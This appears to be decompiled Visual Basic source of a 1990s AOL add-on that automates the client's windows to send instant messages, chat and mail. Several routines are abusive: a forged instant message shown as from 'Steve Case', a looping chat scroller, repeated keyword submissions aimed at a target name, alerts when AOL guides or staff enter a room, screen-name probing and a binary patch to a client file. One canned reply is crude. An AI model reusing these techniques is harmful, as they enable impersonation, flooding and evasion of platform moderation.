lAEC4% = extfn4D90(lAEC2%, "_AOL_Edit")
lAEC6% = extfn4CE8(lAEC4%, gc05D6, 0, pAEC0$)
lAEC8% = extfn4CB0(lAEC4%, gc05D2, 13, 0)
sub27F0 (.001)
End Sub

Sub sub2400 (pAECA As String)
Dim lAECC As Integer
Dim lAECE As Integer
Dim lAED0 As Integer
Dim lAED2 As Integer
Dim lAED4 As Integer
Dim lAED6 As Integer
Dim lAED8 As Integer
lAECC% = extfn2EB8("AOL Frame25", 0&)
lAECE% = extfn4D90(lAECC%, "_AOL_Listbox")
lAED0% = extfn4DC8(lAECE%)
lAED2% = extfn4D90(lAED0%, "_AOL_View")
lAED4% = extfn4D90(lAED0%, "_AOL_Edit")
lAED6% = extfn4CE8(lAED4%, gc05D6, 0, pAECA$)
lAED8% = extfn4CB0(lAED4%, gc05D2, &HD, 0)
sub27F0 .000001
End Sub

Sub sub2438 ()
Dim lAEDA As Integer
Dim lAEDC As Integer
Dim lAEDE As Integer
Dim lAEE0 As Integer
Dim lAEE2 As Integer
Dim lAEE4 As Integer
Dim lAEE6 As Integer
Dim lAEE8 As Integer
Dim lAEEA As Integer
Call sub22B0(fn720(), "Preferences")
Do: DoEvents
lAEDA% = extfn4D58(fn4F0(), "Preferences")
lAEDC% = extfn4D58(lAEDA%, "Mail")
lAEDE% = extfn4C40(lAEDC%, gc05CA)
If lAEDC% <> 0 And lAEDE% <> 0 Then Exit Do
Loop
sub27F0 (.2)
sub9F8 (lAEDE%)
Do: DoEvents
lAEE0% = extfn2EB8("_AOL_Modal", "Mail Preferences")
lAEE2% = extfn4D58(lAEE0%, "Close mail after it has been sent")
lAEE4% = extfn4D58(lAEE0%, "Confirm mail after it has been sent")
lAEE6% = extfn4D58(lAEE0%, "OK")
If lAEE6% <> 0 And lAEE2% <> 0 And lAEE4% <> 0 Then Exit Do
Loop
lAEE8% = extfn4C78(lAEE2%, gc017A, 0, 0)
lAEE8% = extfn4C78(lAEE4%, gc017A, 1, 0)
sub9F8 (lAEE6%)
Do: DoEvents
lAEE0% = extfn2EB8("_AOL_Modal", "Mail Preferences")
Loop Until lAEE0% = 0
lAEEA% = extfn4C78(lAEDA%, gc0024, 0, 0)
End Sub

Sub sub24A8 ()
Dim lAEF6 As Integer
Dim lAEF8 As Integer
Dim lAEFA As Integer
Dim lAEFC As Integer
Dim lAEFE As Integer
Dim lAF00 As Integer
Dim lAF02 As Integer
Dim lAF04 As Integer
Dim lAF06 As Integer
Call sub22B0(fn720(), "Preferences")
Do: DoEvents
lAEF6% = extfn4D58(fn4F0(), "Preferences")
lAEF8% = extfn4D58(lAEF6%, "Mail")
lAEFA% = extfn4C40(lAEF8%, gc05CA)
If lAEF8% <> 0 And lAEFA% <> 0 Then Exit Do
Loop
sub27F0 (.2)
sub9F8 (lAEFA%)
Do: DoEvents
lAEFC% = extfn2EB8("_AOL_Modal", "Mail Preferences")
lAEFE% = extfn4D58(lAEFC%, "Close mail after it has been sent")
lAF00% = extfn4D58(lAEFC%, "Confirm mail after it has been sent")
lAF02% = extfn4D58(lAEFC%, "OK")
If lAF02% <> 0 And lAEFE% <> 0 And lAF00% <> 0 Then Exit Do
Loop
lAF04% = extfn4C78(lAEFE%, gc017A, 1, 0)
lAF04% = extfn4C78(lAF00%, gc017A, 0, 0)
sub9F8 (lAF02%)
Do: DoEvents
lAEFC% = extfn2EB8("_AOL_Modal", "Mail Preferences")
Loop Until lAEFC% = 0
lAF06% = extfn4C78(lAEF6%, gc0024, 0, 0)
End Sub

Sub sub24E0 ()
Dim lAF08 As Variant
Dim lAF0C As Variant
lAF08 = extfn2EB8("aol frame25", 0&)
lAF0C = extfn2E10(lAF08, gc0068)
End Sub

Sub sub2518 ()
Dim lAF10 As Variant
Dim lAF14 As Variant
Dim lAF18 As Variant
lAF10 = extfn2EB8("aol frame25", 0&)
lAF14 = extfn4D90(lAF10, "AOL Toolbar")
lAF18 = extfn2E10(lAF14, gc0068)
End Sub

Sub sub2550 ()
Dim lAF1C As Variant
Dim lAF20 As Variant
Dim lAF24 As Variant
Dim lAF28 As Variant
Dim lAF2C As Variant
lAF1C = extfn4D90(fn410(), "AOL Child")
lAF20 = extfn2E10(lAF1C, 1)
lAF24 = lAF1C
Do
DoEvents
Let lAF28 = lAF24
lAF24 = extfn31C8(lAF24, 2)
lAF2C = extfn2E10(lAF24, 1)
DoEvents
Loop Until lAF28 = lAF24
End Sub

Sub sub2588 ()
Dim lAF30 As Variant
Dim lAF34 As Variant
Dim lAF38 As Variant
Dim lAF3C As Variant
lAF30 = extfn2EB8("aol frame25", 0&)
lAF34 = extfn4D90(lAF30, "MDIClient")
lAF38 = extfn4D58(lAF34, "Buddy Lists")
lAF3C = extfn2E10(lAF38, gc0068)
End Sub

Sub sub25C0 (pAF40 As Variant)
Dim lAF44 As Variant
lAF44 = extfn2E10(pAF40, gc0068)
End Sub

Sub sub2630 ()
Dim lAF54 As Variant
Dim lAF58 As Integer
Dim lAF5A As Integer
Dim lAF5C As Integer
Dim lAF5E As Integer
Dim lAF60 As Integer
Dim lAF62 As Integer
Dim lAF64 As Variant
Dim lAF68 As Variant
Dim lAF6C As Variant
Dim lAF70 As Integer
lAF54 = fn25F8()
If lAF54 = 0 Then
    MsgBox "You must be signed on to use this feature.", 22, "Not Signed On!"
    Exit Sub
End If
lAF58% = extfn2EB8("AOL Frame25", 0&)
lAF5A% = extfn4D90(lAF58%, "MDIClient")
Do
lAF5C% = DoEvents()
lAF5E% = extfn4D58(lAF5A%, "Exit?")
lAF60% = extfn2EB8("_AOL_Modal", "America Online")
Loop Until lAF5E% <> 0 Or lAF60% <> 0
If lAF5E% <> 0 Then
    lAF62% = extfn4D90(lAF5E%, "_AOL_Icon")
    lAF62% = extfn4C40(lAF62%, lAF64)
    lAF62% = extfn4C40(lAF62%, lAF68)
    lAF62% = extfn4C40(lAF62%, lAF68)
    lAF6C = extfn4CB0(lAF62%, gc05C2, 0, 0)
    lAF6C = extfn4CB0(lAF62%, gc05C4, 0, 0)
End If
If lAF60% <> 0 Then
    lAF70% = extfn4D58(lAF60%, "&Yes")
    lAF6C = extfn4CB0(lAF70%, gc05C2, 0, 0)
    lAF6C = extfn4CB0(lAF70%, gc05C4, 0, 0)
End If
End Sub

Sub sub2668 (pAF74 As TextBox)
Dim lAF76 As Variant
Dim lAF7A As Integer
Dim lAF7C As Variant
Dim lAF80 As Variant
lAF76 = pAF74.Text
L18540:
sub2400 "•––•^v^•{‡ " & pAF74 & " ‡}•^v^•—•"
lAF7C = pAF74.Text
lAF7A = Len(lAF7C)
lAF80 = Mid(lAF7C, 2, lAF7A) + Mid(lAF7C, 1, 1)
pAF74.Text = lAF80
sub27F0 .5
If pAF74.Text = lAF76 Then
sub2400 "•––•^v^•{‡ " & pAF74 & " ‡}•^v^•—•"
sub27F0 .5
sub2400 "•––•^v^•{‡ §kå §u©k§ by J¡ZZŸ ‡}•^v^•—•"
Exit Sub
End If
GoTo L18540
End Sub

Sub sub26D8 (pAF98 As Form)
Dim lAF9A As Integer
lAF9A% = extfn2FD0(pAF98.hWnd, gc05DE, 0, 0, 0, 0, gc05DC)
End Sub

Sub sub2710 (pAF9C As Variant)
Randomize
pAF9C = Int((Val("10") * Rnd) + 1)
If pAF9C = "1" Then
pAF9C = "Yes, What?"
ElseIf pAF9C = "2" Then pAF9C = "Don't bother me please."
ElseIf pAF9C = "3" Then pAF9C = "Leave me alone"
ElseIf pAF9C = "4" Then pAF9C = "Hi! Do I know you?"
ElseIf pAF9C = "5" Then pAF9C = "Hello, age/sex/location."
ElseIf pAF9C = "6" Then pAF9C = "Hey!"
ElseIf pAF9C = "7" Then pAF9C = "Hi! =)"
ElseIf pAF9C = "8" Then pAF9C = "What's up?"
ElseIf pAF9C = "9" Then pAF9C = "MmMmmmM... suck my dick harder Billy gates!!!!!!" & Chr(13) & "Woah.. sorry wrong IM =)"
ElseIf pAF9C = "10" Then pAF9C = "Do you want to cyber?"
End If
End Sub

Sub sub2748 ()
Dim lAFA0 As Variant
Dim lAFA4 As String
Dim lAFA6 As Integer
Dim lAFA8 As String
Dim lAFAA As Variant
Dim lAFAE As Integer
lAFA4 = fn1520()
Call sub2710(lAFA8$)
Call sub448(lAFA4$, lAFA8$)
lAFA0 = fn2A20("Untitled", "AOL Child")
lAFAA = extfn2E10(lAFA0, gv0064)
sub27F0 2
lAFA6% = extfn4D58(fn4F0(), ">Instant Message From:")
lAFAE% = extfn4D90(lAFA6%, "RICHCNTL")
Call sub27B8(lAFA6%, ">Instant Message From:  Steve Case")
Call sub27B8(lAFAE%, "Steve Case:" & Chr(9) & lAFA8$ & Chr(13) & Chr(13) & Chr(13) & Chr(13) & Chr(13) & Chr(13) & Chr(13) & Chr(13) & Chr(13) & Chr(13) & Chr(13) & Chr(13))
lAFAA = extfn2E10(lAFA0, gc0068)
End Sub

Sub sub27B8 (pAFB6 As Integer, ByVal pAFB8 As String)
Dim lAFBA As Variant
lAFBA = extfn4CE8(pAFB6, &HC, 0, pAFB8)
End Sub

Sub sub27F0 (pAFBE As Variant)
Dim lAFC2 As Variant
Dim lAFC6 As Variant
lAFC2 = Timer
Do While Timer - lAFC2 < pAFBE
lAFC6 = DoEvents()
Loop
End Sub

Sub sub2828 (pAFCA As String, pAFCC As String)
Dim lAFCE As Integer
Dim lAFD0 As Integer
Dim lAFD2 As Integer
Dim lAFD4 As Integer
Dim lAFD6 As Integer
Dim lAFD8 As Integer
Dim lAFDA As Integer
Dim lAFDC As Integer
lAFCE% = extfn2EB8("AOL Frame25", 0&)
lAFD0% = extfn4D90(lAFCE%, "_AOL_Listbox")
lAFD2% = extfn4DC8(lAFD0%)
lAFD4% = extfn4D90(lAFD2%, "_AOL_View")
lAFD6% = extfn4D90(lAFD2%, "_AOL_Edit")
lAFD8% = extfn4D58(lAFD2%, "Send")
lAFDA% = extfn4CE8(lAFD4%, gc05D6, 0, Chr(13) & Chr(9) & pAFCA$ & ":" & Chr(9) & pAFCC$)
lAFDC% = extfn4CB0(lAFD4%, gc05D2, &HD, 0)
sub27F0 (.1)
End Sub

Sub sub288 (p06F4 As Integer)
Dim l06F6 As String
Dim l06F8 As Variant
Dim l06FC As Variant
If l06F6$ = "OFF" Then
Exit Sub
End If
l06F8 = extfn4CB0(p06F4, gc05C2, 0, 0&)
sub27F0 .008
l06FC = extfn4CB0(p06F4, gc05C4, 0, 0&)
End Sub

Sub sub2940 ()
Dim lB018 As Variant
Dim lB01C As String
lB01C$ = extfn3BA0$(lB018)
End Sub

Sub sub2978 ()
Dim lB01E As Integer
Dim lB020 As Integer
Dim lB022 As Variant
lB01E = extfn49D8()
lB020 = extfn49D8()
Do Until lB020 <> lB01E
lB022 = DoEvents()
lB020 = extfn49D8()
Loop
End Sub

Sub sub29B0 ()
Dim lB026 As Variant
Do
DoEvents
lB026 = extfn2EB8("_AOL_Modal", 0&)
DoEvents
Loop Until lB026 <> 0
lB026 = extfn2EB8("_AOL_Modal", 0&)
sub1A28 (lB026)
End Sub

Sub sub29E8 ()
Dim lB02A As Variant
Dim lB02E As String
Dim lB030 As Variant
Dim lB034 As Variant
Dim lB038 As Variant
Do
DoEvents
lB02A = extfn2EB8("#32770", "America Online")
If lB02E$ = "OFF" Then
Exit Sub
Exit Do
End If
lB030 = extfn4D58(lB02A, "OK")
DoEvents
Loop Until lB030 <> 0
Do
lB02A = extfn2EB8("#32770", "America Online")
    lB030 = extfn4D58(lB02A, "OK")
    lB034 = extfn4CB0(lB030, gc05C2, 0, 0&)
    lB038 = extfn4CB0(lB030, gc05C4, 0, 0&)
DoEvents
Loop Until lB02A = 0
End Sub

Sub sub2A58 ()
Dim lB04C As Variant
Dim lB050 As Variant
Dim lB054 As Variant
Dim lB058 As Variant
Dim lB05C As Variant
Do
lB04C = extfn4D58(extfn2EB8("AOL Frame25", "America  Online"), "New Mail")
sub27F0 (.1)
Loop Until lB04C <> 0
lB050 = extfn4D90(lB04C, "_AOL_Tree")
Do
DoEvents
lB054 = extfn4C78(lB050, gc0060, 0, 0&)
Call sub27F0(.5)
lB058 = extfn4C78(lB050, gc0060, 0, 0&)
Call sub27F0(.5)
lB05C = extfn4C78(lB050, gc0060, 0, 0&)
Loop Until lB054 = lB058 And lB058 = lB05C
    lB054 = extfn4C78(lB050, gc0060, 0, 0&)
End Sub

Sub sub2A90 ()
Dim lB060 As Integer
Dim lB062 As String
Dim lB064 As String
Dim lB066 As Variant
Dim lB06A As Variant
Dim lB06E As Variant
For lB060% = 0 To 25
lB062$ = String$(256, " ")
lB066 = extfn2C50(lB060%, lB062$) & lB064$
If Len(Trim$(lB062$)) <= 1 Then GoTo L275B2
lB062$ = Left$(Trim$(lB062$), Len(Trim(lB062$)) - 1)
lB06A = InStr(LCase$(lB062$), LCase$("catwatch"))
lB06E = InStr(LCase$(lB062$), LCase$("catid"))
If lB06A <> 0 Then
Call sub1980("PC")
MsgBox "A Cat had entered the room."
End If
If lB06E <> 0 Then
Call sub1980("PC")
MsgBox "A Cat had entered the room."
End If
Next lB060%
L275B2:
End Sub

Sub sub2AC8 ()
Dim lB072 As Integer
Dim lB074 As String
Dim lB076 As String
Dim lB078 As Variant
Dim lB07C As Variant
For lB072% = 0 To 25
lB074$ = String$(256, " ")
lB078 = extfn2C50(lB072%, lB074$) & lB076$
If Len(Trim$(lB074$)) <= 1 Then GoTo L276DE
lB074$ = Left$(Trim$(lB074$), Len(Trim(lB074$)) - 1)
lB07C = InStr(LCase$(lB074$), LCase$("guide"))
If lB07C <> 0 Then
Call sub1980("PC")
MsgBox "A Guide had entered the room."
End If
Next lB072%
L276DE:
End Sub

Sub sub2B00 (pB080 As Variant)
Dim lB084 As Variant
Do
lB084 = 1 + lB084
Loop Until lB084 > pB080
End Sub

Sub sub2BE0 (pB0A4 As Variant, pB0A8 As Variant, pB0AC As Variant, pB0B0 As String)
Dim lB0B2 As Integer
    lB0B2 = extfn3A50(pB0A4, pB0A8, pB0AC, pB0B0)
End Sub

Sub sub2F8 ()
Dim l0708 As Integer
Dim l070A As Integer
Dim l070C As Integer
Call sub22B0(fn720(), "&About America Online")
Do: DoEvents
l0708% = extfn2EB8("_AOL_Modal", 0&)
Loop Until l070A% <> 0
l070C% = extfn4C78(l0708%, gc0024, 0, 0)
End Sub

Sub sub448 (p0768 As String, p076A As String)
Dim l076C As Variant
Dim l0770 As Variant
Dim l0774 As Variant
Dim l0778 As Variant
Dim l077C As Variant
Dim l0780 As Variant
Dim l0784 As Integer
Dim l0786 As Integer
Dim l0788 As Integer
Dim l078A As Variant
l076C = extfn2EB8("#32770", "America Online")
l0770 = extfn4D58(l076C, "OK")
l0774 = extfn4CB0(l0770, gc05C2, 0, 0&)
l0778 = extfn4CB0(l0770, gc05C4, 0, 0&)
sub2198 "Send an Instant Message"
Do
l077C = extfn2EB8("AOL Frame25", 0&)
l0780 = extfn4D58(l077C, "Send Instant Message")
l0784% = extfn4D90(l0780, "_AOL_Edit")
DoEvents
Loop Until l0784% <> 0
l0784% = extfn4D90(l0780, "_AOL_Edit")
Do
l0786% = extfn4D90(l0780, "RICHCNTL")
l0788% = extfn4D58(l0780, "Send")
DoEvents
sub27F0 (.001)
Loop Until l0786% <> 0 Or l0788% <> 0
If l0786% <> 0 Then
sub2320 l0784%, p0768$
sub2320 l0786%, p076A$
sub27F0 (.001)
sub1440 l0786%, 1
sub9F8 l0786%
Else
sub2320 l0784%, p0768$
sub1440 l0784%, 1
sub2320 l0784%, p076A$
sub1440 l0784%, 1
sub9F8 l0784%
End If
sub27F0 (.001)
l078A = extfn4CB0(l0780, gc0024, 0, 0)
End Sub

Sub sub528 ()
If fn330() Then Exit Sub
sub1980 ("pc")
Do: DoEvents
Loop Until fn330()
End Sub

Sub sub560 (p07C6 As Variant)
If p07C6 = 1 Then
Call sub608("Read &New Mail")
End If
If p07C6 = 2 Then
Call sub608("Check Mail You've &Read")
End If
If Not p07C6 = 1 Or Not p07C6 = 2 Then
Call sub608("Check Mail You've &Sent")
End If
End Sub

Sub sub598 (p07CA)
Dim l07CE As Integer
Dim l07D0 As Variant
Dim l07D4 As Variant
l07CE% = extfn4D58(fn4F0(), ">Instant Message From:")
If l07CE% Then GoTo L2636
l07CE% = extfn4D58(fn4F0(), "  Instant Message From:")
If l07CE% Then GoTo L2636
Exit Sub
L2636:
l07D0 = extfn4D90(l07CE%, "RICHCNTL")
l07D0 = extfn4C40(l07D0, 2)
l07D0 = extfn4C40(l07D0, 2)
l07D0 = extfn4C40(l07D0, 2)
l07D0 = extfn4C40(l07D0, 2)
l07D0 = extfn4C40(l07D0, 2)
l07D0 = extfn4C40(l07D0, 2)
l07D0 = extfn4C40(l07D0, 2)
l07D0 = extfn4C40(l07D0, 2)
l07D0 = extfn4C40(l07D0, 2)
l07D4 = extfn4C40(l07D0, 2)
l07D0 = extfn4C40(l07D4, 2)
Call sub640(l07D4, p07CA)
sub9F8 (l07D0)
End Sub

Sub sub608 (ByVal p07E4 As String)
Call sub22B0(fn720(), p07E4)
End Sub

Sub sub640 (p07E6 As Variant, p07EA As Variant)
Dim l07EE As Integer
l07EE% = extfn4CE8(p07E6, gc05D6, 0, p07EA)
End Sub

Sub sub678 ()
Dim l07F0 As Integer
Dim l07F2 As Variant
Dim l07F6 As Integer
Dim l07F8 As Integer
Dim l07FA As Integer
l07F0% = extfn2EB8("AOL Frame25", 0&)
If l07F0% = 0 Then MsgBox "AOL client error: Please open Windows America Online before continuing.", 64, "Error: Windows America Online": Exit Sub
l07F2 = fn21D0(7, 0)
Exit Sub
Do: DoEvents
l07F0% = extfn2EB8("AOL Frame25", 0&)
l07F6% = extfn4D58(l07F0%, "Sign Off?")
If l07F6% <> 0 Then
l07F8% = extfn4D90(l07F6%, "_AOL_Icon")
l07F8% = extfn4C40(l07F8%, 2)
l07F8% = extfn4C40(l07F8%, 2)
l07F8% = extfn4C40(l07F8%, 2)
l07F8% = extfn4C40(l07F8%, 2)
l07F8% = extfn4C40(l07F8%, 2)
l07FA% = extfn4C78(l07F8%, gc05C2, 0, 0&)
l07FA% = extfn4C78(l07F8%, gc05C4, 0, 0&)
Exit Do
End If
Loop
End Sub

Sub sub6E8 ()
Dim l080C As Integer
Dim l080E As Integer
Dim l0810 As Variant
Dim l0814 As Variant
l080C% = extfn3740(fn4F0())
l080E% = extfn4D90(l080C%, "_AOL_Tree")
Do: DoEvents
l0810 = extfn4C78(l080E%, gc0060, 0, 0)
sub27F0 3
l0814 = extfn4C78(l080E%, gc0060, 0, 0)
If l0810 = l0814 Then Exit Do
Loop
End Sub

Sub sub758 ()
Dim l081E As Integer
Dim l0820 As Integer
Dim l0822 As String
Dim l0824 As Integer
Dim l0826 As Integer
Dim l0828 As Integer
Dim l082A As Integer
Dim l082C As Integer
Dim l082E As Integer
Dim l0830 As Integer
Dim l0832 As Integer
l081E% = extfn2EB8("AOL Frame25", 0&)
l0820% = fn6B0()
If l0820% = 25 Then l0822$ = "Set Preferences" + Chr$(9) + "Ctrl+="
If l0820% = 3 Then l0822$ = "Preferences"
DoEvents
Do
DoEvents
l0826% = extfn4D58(l081E%, "Preferences")
DoEvents
Loop Until l0826% <> 0
DoEvents
If l0820% = 25 Then l0828% = fn11D8(l0826%, "_AOL_Icon", 3)
If l0820% = 3 Then l0828% = fn11D8(l0826%, "_AOL_ICON", 1)
DoEvents
sub288 (l0828%)
DoEvents
Do
DoEvents
l081E% = extfn2EB8("AOL Frame25", 0&)
l082A% = extfn2EB8("_AOL_Modal", "Chat Preferences")
DoEvents
Loop Until l082A% <> 0
DoEvents
l082C% = extfn4D58(l082A%, "Notify me when members arrive")
DoEvents
DoEvents
l082E% = extfn4CB0(l082C%, gc017A, True, 0&)
DoEvents
l0830% = extfn4D58(l082A%, "OK")
DoEvents
sub288 (l0830%)
DoEvents
l0832% = extfn4CB0(l0826%, gc0024, 0, 0&)
End Sub

Sub sub7C8 (p0840 As String)
Call sub448((p0840$), ("<a href=GenOziDe>"))
End Sub

Sub sub800 (p0842 As String)
Dim l0844 As String
Dim l0846 As Variant
Dim l084A As Variant
Dim l084E As Variant
Dim l0852 As Variant
Dim l0856 As Variant
Dim l085A As Variant
Dim l085E As Variant
Dim l0862 As Variant
Dim l0866 As Variant
L3230:
If l0844$ = "OFF" Then
Exit Sub
End If
Let l0846 = l0846 + 1
l084A = extfn2EB8("AOL Frame25", 0&)
Do
DoEvents
l084E = extfn4D58(l084A, "Keyword")
DoEvents
Loop Until l084E <> 0
l0852 = extfn4D90(l084E, "_AOL_Icon")
l0856 = extfn4D90(l084E, "_AOL_Edit")
l085A = extfn4CE8(l0856, gc05D6, 0, "aol://2719:2-2-" & p0842$)
l085E = extfn4CB0(l0852, gc05C2, 0, 0&)
l0862 = extfn4CB0(l0852, gc05C4, 0, 0&)
sub29E8
If l0866 = "NO" Then
Exit Sub
End If
sub27F0 .2
GoTo L3230
End Sub

Sub sub838 (p086C As Form)
p086C.Top = (Screen.Height * .85) / 2 - p086C.Height / 2
p086C.Left = Screen.Width / 2 - p086C.Width / 2
End Sub

Sub sub870 ()
Dim l0872 As Variant
Dim l0876 As Integer
l0872 = extfn49D8()
Do
  DoEvents
  l0876 = extfn49D8()
Loop While l0872 = l0876
End Sub

Sub sub8A8 (p0878)
Open "C:\AOL25\tool\chat.aol" For Binary As #1
Seek #1, 6935
Put #1, , p0878
Close #1
End Sub

Sub sub9C0 (p08A2 As String)
Dim l08A4 As Integer
Dim l08A6 As Variant
Dim l08AA As Variant
Dim l08AE As Integer
Dim l08B0 As Integer
Dim l08B2 As Variant
Dim l08B6 As Integer
Dim l08B8 As Integer
Dim l08BA As Integer
Dim l08BC As Integer
Dim l08BE As Integer
Dim l08C0 As Integer
Dim l08C2 As Integer
Dim l08C4 As Integer
Dim l08C6 As Integer
Dim l08C8 As Integer
Dim l08CA As Integer
Dim l08CC As Integer
Dim l08CE As Integer
Dim l08D0 As Integer
Dim l08D2 As Variant
Dim l08D6 As Integer
Dim l08D8 As Variant
Dim l08DC As Integer
Dim l08DE As Variant
Dim l08E2 As Variant
Do
l08A4% = extfn2EB8("AOL Frame25", 0&)
l08A6 = extfn4D58(l08A4%, "Compose Mail")
sub2320 l08A6, "Compose Mail"
DoEvents
Loop Until l08A6 = 0
l08A4% = extfn2EB8("AOL Frame25", 0&)
sub2198 "Compose"
Do
l08AA = DoEvents()
l08AE% = extfn4D58(l08A4%, "Compose Mail")
l08B0% = extfn4D90(l08AE%, "_AOL_Edit")
l08B2 = extfn2E10(l08AE%, gv0064)
Loop Until l08B0% <> 0
l08B6% = extfn4DC8(l08AE%)
l08B8% = extfn4D90(l08AE%, "_AOL_Icon")
l08BA% = extfn4D90(l08AE%, "_AOL_View")
l08B0% = extfn4D90(l08AE%, "_AOL_Edit")
l08BC% = extfn4CE8(l08B0%, gc05D6, 0, p08A2$ & ", '")
l08BE% = extfn4C40(l08B0%, gc05CA)
l08C0% = extfn4C40(l08BE%, gc05CA)
l08C2% = extfn4C40(l08C0%, gc05CA)
l08C4% = extfn4C40(l08C2%, gc05CA)
l08BC% = extfn4CE8(l08C4%, gc05D6, 0, "TOS check")
l08C6% = extfn4C40(l08C4%, gc05CA)
l08C8% = extfn4C40(l08C6%, gc05CA)
l08CA% = extfn4C40(l08C8%, gc05CA)
l08CC% = extfn4C40(l08CA%, gc05CA)
l08CE% = extfn4C40(l08CC%, gc05CA)
l08D0% = extfn4C40(l08CE%, gc05CA)
l08BC% = extfn4CE8(l08CA%, gc05D6, 0, "TOS Check")
l08D2 = extfn4D90(l08AE%, "RICHCNTL")
l08BC% = extfn4CE8(l08D2, gc05D6, 0, "TOS Check")
sub27F0 (.1)
l08D6% = extfn4CB0(l08B8%, gc05C2, &HD, 0)
l08D6% = extfn4CB0(l08B8%, gc05C4, &HD, 0)
sub27F0 (.1)
Do
l08D8 = extfn4D58(l08A4%, "Error")
sub27F0 (.001)
Loop Until l08D8 <> 0
l08DC% = extfn4D90(l08D8, "_AOL_View")
l08DE = fn15C8(l08DC%)
If InStr(LCase$(l08DE), LCase$(p08A2$)) Then
l08E2 = 1
End If
If InStr(LCase$(l08DE), LCase$("mailbox")) Then
l08E2 = 0
End If
sub1A28 (l08D8)
sub1A28 (l08AE%)
Do
l08A4% = extfn2EB8("AOL Frame25", 0&)
l08A6 = extfn4D58(l08A4%, "Compose Mail")
sub2320 l08A6, "Compose Mail"
DoEvents
Loop Until l08A6 = 0
End Sub

Sub sub9F8 (p08E6 As Integer)
Dim l08E8 As Integer
l08E8% = extfn4CB0(p08E6%, gc05C2, &HD, 0)
l08E8% = extfn4CB0(p08E6%, gc05C4, &HD, 0)
End Sub

Sub subA30 (p08EA As String, p08EC As String)
Dim l08EE As Integer
Dim l08F0 As String
Dim l08F2 As Integer
Dim l08F4 As String
Dim l08F6 As Integer
Dim l08F8 As Integer
Dim l08FA As Integer
Dim l08FC As Integer
Dim l0900 As Integer
Dim l0902 As Integer
l08EE = -1
l0900% = extfn2EB8("AOL Frame25", 0&)
l0902 = extfn2CC0(l0900%)
Do
    DoEvents
    l08EE = l08EE + 1
    l08F0$ = String$(255, 0)
    l08F2% = extfn4B28(l0902, l08EE, l08F0$, Len(p08EC) + 1, &H400)
    l08F4 = fn2898(l08F0$)
    If l08F4 = p08EC Then Exit Do
Loop
l08F6 = extfn4BD0(l0902, l08EE)
l08F8 = -1
Do
    DoEvents
    l08F8 = l08F8 + 1
    l08F0$ = String(255, 0)
    l08F2% = extfn4B28(l08F6, l08F8, l08F0$, Len(p08EA) + 1, &H400)
    l08F4 = fn2898(l08F0$)
    If l08F4 = p08EA Then Exit Do
Loop
DoEvents
l08FA% = extfn4B98(l08F6, l08F8)
l08FC = extfn4CB0(l0900, &H111, l08FA%, 0&)
End Sub

Sub subA68 ()
Dim l0904 As Integer
Dim l0906 As Integer
Dim l0908 As Integer
Dim l090A As Integer
Dim l090C As Integer
Dim l090E As Integer
Dim l0910 As Integer
Dim l0912 As Integer
Dim l0914 As Integer
Dim l0916 As Integer
Dim l0918 As Integer
Dim l091A As Integer
Dim l091C As Integer
Dim l091E As Integer
Dim l0920 As Integer
Dim l0922 As Integer
Dim l0924 As Integer
l0904% = extfn2EB8("AOL Frame25", 0&)
l0906% = extfn4D90(l0904%, "Aol Toolbar")
l0908% = extfn4D90(l0906%, "_Aol_Icon")
l090A% = extfn4C40(l0908%, 2)
l090C% = extfn4C40(l090A%, 2)
l090E% = extfn4C40(l090C%, 2)
l0910% = extfn4C40(l090E%, 2)
l0912% = extfn4C40(l0910%, 2)
l0914% = extfn4C40(l0912%, 2)
l0916% = extfn4C40(l0914%, 2)
l0918% = extfn4C40(l0916%, 2)
l091A% = extfn4C40(l0918%, 2)
l091C% = extfn4C40(l091A%, 2)
l091E% = extfn4C40(l091C%, 2)
l0920% = extfn4C40(l091E%, 2)
l0922% = extfn4C78(l0920%, gc05C2, 0&, 0&)
l0924% = extfn4C78(l0920%, gc05C4, 0&, 0&)
End Sub

Sub subAA0 ()
Dim l0926 As Integer
Dim l0928 As Integer
Dim l092A As Integer
Dim l092C As Integer
Dim l092E As Integer
Dim l0930 As Integer
Dim l0932 As Integer
Dim l0934 As Integer
Dim l0936 As Integer
Dim l0938 As Integer
Dim l093A As Integer
Dim l093C As Integer
Dim l093E As Integer
Dim l0940 As Integer
Dim l0942 As Integer
Dim l0944 As Integer
Dim l0946 As Integer
Dim l0948 As Integer
Dim l094A As Integer
Dim l094C As Integer
Dim l094E As Integer
Dim l0950 As Integer
Dim l0952 As Integer
l0926% = extfn2EB8("AOL Frame25", 0&)
l0928% = extfn4D90(l0926%, "Aol Toolbar")
l092A% = extfn4D90(l0928%, "_Aol_Icon")
l092C% = extfn4C40(l092A%, 2)
l092E% = extfn4C40(l092C%, 2)
l0930% = extfn4C40(l092E%, 2)
l0932% = extfn4C40(l0930%, 2)
l0934% = extfn4C40(l0932%, 2)
l0936% = extfn4C40(l0934%, 2)
l0938% = extfn4C40(l0936%, 2)
l093A% = extfn4C40(l0938%, 2)
l093C% = extfn4C40(l093A%, 2)
l093E% = extfn4C40(l093C%, 2)
l0940% = extfn4C40(l093E%, 2)
l0942% = extfn4C40(l0940%, 2)
l0944% = extfn4C40(l0942%, 2)
l0946% = extfn4C40(l0944%, 2)
l0948% = extfn4C40(l0946%, 2)
l094A% = extfn4C40(l0948%, 2)
l094C% = extfn4C40(l094A%, 2)
l094E% = extfn4C40(l094C%, 2)
l0950% = extfn4C78(l094C%, gc05C2, 0&, 0&)
l0952% = extfn4C78(l094C%, gc05C4, 0&, 0&)
End Sub

Sub subB10 ()
Dim l0960 As Integer
Dim l0962 As Variant
Dim l0966 As Integer
Dim l0968 As Variant
MsgBox "Wait For Hourglass To Clear..... And Click OK"
l0960% = extfn2EB8("AOL Frame25", 0&)
l0962 = extfn4D58(l0960%, "New Mail")
l0966% = extfn4D90(l0962, "_AOL_TREE")
l0968 = extfn4CB0(l0966%, gc0060, 0, 0)
If l0968 > 1 Then
MsgBox "You have " & l0968 & " messages in your E-Mailbox."
End If
If l0968 = 1 Then
MsgBox "You have one message in your E-Mailbox."
End If
If l0968 < 1 Then
MsgBox "You have zero messages in your E-Mailbox"
End If
End Sub

Sub subB48 ()
Dim l096C As Integer
Dim l096E As Integer
Dim l0970 As Variant
Dim l0974 As Integer
Dim l0976 As Integer
Dim l0978 As Variant
Dim l097C As String
Dim l097E As Integer
Dim l0980 As Integer
    l096C% = extfn2EB8("AOL Frame25", 0&)
    l096E% = extfn2CC0(l096C%)
    l0970 = 0
    Do
        l0974% = DoEvents()
        l0976% = extfn4BD0(l096E%, l0970)
        If l0976% <> 0 Then l0970 = l0970 + 1 Else Exit Do
    Loop
    For l0978 = 0 To l0970 - 1
